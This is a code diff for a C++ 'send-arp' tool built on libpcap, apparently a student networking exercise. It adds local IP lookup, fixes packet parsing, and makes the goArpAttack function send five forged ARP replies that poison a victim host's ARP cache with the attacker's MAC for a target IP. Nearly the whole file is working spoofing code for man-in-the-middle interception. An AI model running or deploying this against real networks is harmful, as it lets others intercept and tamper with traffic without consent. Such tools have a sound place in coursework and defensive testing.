@@ -6,6 +6,11 @@
 #include <cstdlib>
 #include <string>
 #include <cstdbool>
+#include <ifaddrs.h>
+#include <arpa/inet.h>
+#include <netinet/in.h>
+#include <cstring>
+#include <vector>
 
 using namespace std;
 
@@ -18,13 +23,49 @@ struct EthArpPacket final {
 
 char*	device;
 Mac		localMac;
+Ip      localIp;
+
+void getLocal() {
+    struct ifaddrs *ifaddr, *ifa;
+    char ip[100];
+
+    if (getifaddrs(&ifaddr) == -1) {
+        perror("getifaddrs");
+        return;
+    }
+
+    for (ifa = ifaddr; ifa != nullptr; ifa = ifa->ifa_next) {
+        if (ifa->ifa_addr == nullptr) {
+            continue;
+        }
+
+        if (ifa->ifa_addr->sa_family == AF_INET) { // AF_INET for IPv4
+            void *addr = &((struct sockaddr_in *)ifa->ifa_addr)->sin_addr;
+
+            // Convert the IP to a string
+            if (inet_ntop(AF_INET, addr, ip, 32) == nullptr) {
+                perror("inet_ntop");
+                return;
+            }
+            if(!strcmp(ifa->ifa_name, device)){
+                localIp = Ip(ip);
+                freeifaddrs(ifaddr);
+                return;
+            }
+        }
+    }
+
+    freeifaddrs(ifaddr);
+    printf("[error] error in geting ip");
+}
+
 
 void usage() {
 	printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
 	printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
 }
 
-void sendArp(Mac smac, Mac dmac, Ip sip, Ip tip, int mode){ // mode: ArpHdr::Reply, ArpHdr::Request
+void sendArp(Mac smac, Mac dmac, Ip sip, Ip tip, uint16_t mode){ // mode: ArpHdr::Reply, ArpHdr::Request
 	EthArpPacket packet;
 	char  		 errbuf[PCAP_ERRBUF_SIZE];
 	pcap_t*		 handle = pcap_open_live(device, 0, 0, 0, errbuf);
@@ -37,6 +78,10 @@ void sendArp(Mac smac, Mac dmac, Ip sip, Ip tip, int mode){ // mode: ArpHdr::Rep
 	packet.eth_.dmac_ = dmac;
 	packet.eth_.smac_ = smac;
 	packet.eth_.type_ = htons(EthHdr::Arp);
+
+    if(dmac == Mac("ff:ff:ff:ff:ff:ff")){
+        dmac = Mac("00:00:00:00:00:00");
+    }
 
 	packet.arp_.hrd_  = htons(ArpHdr::ETHER);
 	packet.arp_.pro_  = htons(EthHdr::Ip4);
@@ -75,50 +120,52 @@ void getLocalMac(){
 	fclose(fp);
 }
 
-map<Ip, Mac> dataMap;
+map<Ip, int> dataMap;
+int          cnts = 0;
+vector<Mac>  macs = {};
+
 void getMacFromArp(Ip tip, Ip usingip){
-	if(dataMap.find(tip) != dataMap.end()) return;
+    if(dataMap.find(tip) != dataMap.end()) return;
 
-	sendArp(localMac, Mac("ff:ff:ff:ff:ff:ff"), usingip, tip, ArpHdr::Request);
+    const u_char* data;
+    pcap_pkthdr*  temp;
+    char          errbuf[PCAP_ERRBUF_SIZE];
 
-	char  	errbuf[PCAP_ERRBUF_SIZE];
+    sendArp(localMac, Mac("ff:ff:ff:ff:ff:ff"), usingip, tip, ArpHdr::Request);
+
     pcap_t* handle = pcap_open_live(device, BUFSIZ, 1, 1, errbuf);
 	if (handle == nullptr) {
 		fprintf(stderr, "couldn't open device %s(%s)\n", device, errbuf);
 		exit(-1);
 	}
 
-    EthArpPacket  packet;
-    const u_char* data;
-    pcap_pkthdr*  temp;
-
-	while(1){
+    while(1){
         int res = pcap_next_ex(handle, &temp, &data);
 		if(res==0) continue;
 		if(res==-1 || res==-2){
 			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
 			break;
-		}
+        }
 
-        EthArpPacket* packetPtr = (EthArpPacket*)temp;
-        packet = *packetPtr;
+        EthArpPacket* packetPtr = (EthArpPacket*)data;
 
-		if(packet.eth_.type_ != htons(EthHdr::Arp))	continue;
-		if(packet.arp_.sip_  != htonl(tip)) 		continue;
-		
-		dataMap.insert( { Ip(ntohl(packet.arp_.sip_)), Mac(packet.arp_.smac_) } );
+        if(packetPtr->eth_.type_ != htons(EthHdr::Arp))	continue;
+        if(packetPtr->arp_.sip_  != htonl(tip)) 		continue;
+
+        macs.push_back(packetPtr->arp_.smac());
+
+        dataMap.insert( { Ip(ntohl(packetPtr->arp_.sip_)), cnts++ } );
 		break;
-	}
-
-	pcap_close(handle);
+    }
+    pcap_close(handle);
 }
 
 void goArpAttack(Ip sip, Ip tip){
-	getMacFromArp(sip, tip);
+    getMacFromArp(sip, localIp);
 
-	Mac smac = dataMap[sip];
+    Mac smac = macs[dataMap[sip]];
 
-	sendArp(localMac, smac, tip, sip, ArpHdr::Reply);
+    for(int i=0;i<5;i++) sendArp(localMac, smac, tip, sip, ArpHdr::Reply);
 }
 
 int main(int argc, char* argv[]) {
@@ -129,9 +176,12 @@ int main(int argc, char* argv[]) {
 	device = argv[1];
 
 	getLocalMac();
+    getLocal();
 
 	for(int i=2; i<argc; i+=2){
+        printf("processing %s to %s\n", argv[i], argv[i+1]);
 		goArpAttack(Ip(argv[i]), Ip(argv[i+1]));
+        printf("success!\n");
 	}
 	
 	return 0;
